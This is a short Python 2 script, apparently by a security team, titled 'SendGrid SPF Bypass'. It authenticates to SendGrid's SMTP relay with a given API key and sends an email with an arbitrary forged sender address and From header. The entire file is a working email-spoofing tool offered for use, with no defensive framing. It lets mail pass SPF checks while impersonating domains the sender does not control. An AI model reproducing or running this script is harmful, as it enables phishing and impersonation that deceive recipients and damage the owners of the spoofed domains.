import sys
import socket

def format_body(source, to, subject, data):
	output = "From:%s\r\nTo:%s\r\nSubject:%s\r\n\r\n%s.\r\n\r\n" % (source, to, subject, data)
	return output
	
if __name__ == "__main__":

	print "SendGrid SPF Bypass Mr.Un1k0d3r & Tazz0 RingZer0 Team\r\n"
	if len(sys.argv) < 6:
		print "Usage: %s apikey source destination subject emailfile" % sys.argv[0]
		exit(0)

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("smtp.sendgrid.net", 25))
	
	s.recv(1024)
	s.send("AUTH LOGIN\r\n")
	s.recv(1024)
	s.send("YXBpa2V5\r\n")
	s.recv(1024)
	s.send("%s\r\n" % sys.argv[1])
	auth = s.recv(1024)
	if auth.find("235 Authentication successful") == -1:
		print "Auth failed"
		sys.exit(0)
	print auth.strip()	
		
	s.send("mail from:%s\r\n" % sys.argv[2])
	print s.recv(1024).strip()
	s.send("rcpt to:%s\r\n" % sys.argv[3])
	print s.recv(1024).strip()
	s.send("DATA\r\n")
	body = format_body(sys.argv[2], sys.argv[3], sys.argv[4], open(sys.argv[5], "rb").read())
	s.send(body)
	s.close()
	print "[+] Completed"
